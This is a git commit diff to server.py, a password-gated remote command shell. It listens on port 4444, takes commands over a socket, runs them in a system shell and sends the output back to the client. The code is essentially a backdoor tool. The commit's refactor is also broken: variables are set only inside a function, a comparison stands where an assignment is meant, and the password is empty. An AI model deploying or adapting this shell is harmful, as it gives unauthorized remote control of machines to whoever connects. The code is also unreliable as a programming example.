226dc00885d0f1303e6acdc4c831108b002e1187
albertuslaksana <89668012+albertuslaksana@users.noreply.github.com>
2023-03-08 14:47:27 -0600

    Update server.py

--- server.py
+++ server.py
@@ -1,6 +1,20 @@
 import socket
 import subprocess
 
+
+def lookForConnection(server):
+    server.listen(1)
+    client, client_addr = server.accept()
+    client.send(("Input password for client: ").encode())
+    password = client.recv(1024)
+    password = password.decode()
+    if password == real_password:
+        passwords_match = True
+    else:
+        client.send(("Incorrect Password...Closing Connection").encode())
+        client.close()
+    print(str(client_addr) + " has connected to the server")
+
 HOST = '10.0.2.5'
 PORT = 4444 
 real_password = ""
@@ -9,17 +23,7 @@ server = socket.socket()
 server.bind((HOST, PORT))
 print('Server Started')
 print('Listening For Client Connection')
-server.listen(1)
-client, client_addr = server.accept()
-client.send(("Input password for client: ").encode())
-password = client.recv(1024)
-password = password.decode()
-if password == real_password:
-    passwords_match = True
-else:
-    client.send(("Incorrect Password...Closing Connection").encode())
-    client.close()
-print(str(client_addr) + " has connected to the server")
+lookForConnection(server)
 
 while passwords_match == True:
     print("[-] Awaiting commands...")
@@ -28,8 +32,10 @@ while passwords_match == True:
     if command == "exit":
         passwords_match == False
         client.close()
-    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-    output = op.stdout.read()
-    output_error = op.stderr.read()
-    print("[-] Sending response...")
-    client.send(output + output_error)
+        lookForConnection(server)
+    else:
+        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+        output = op.stdout.read()
+        output_error = op.stderr.read()
+        print("[-] Sending response...")
+        client.send(output + output_error)
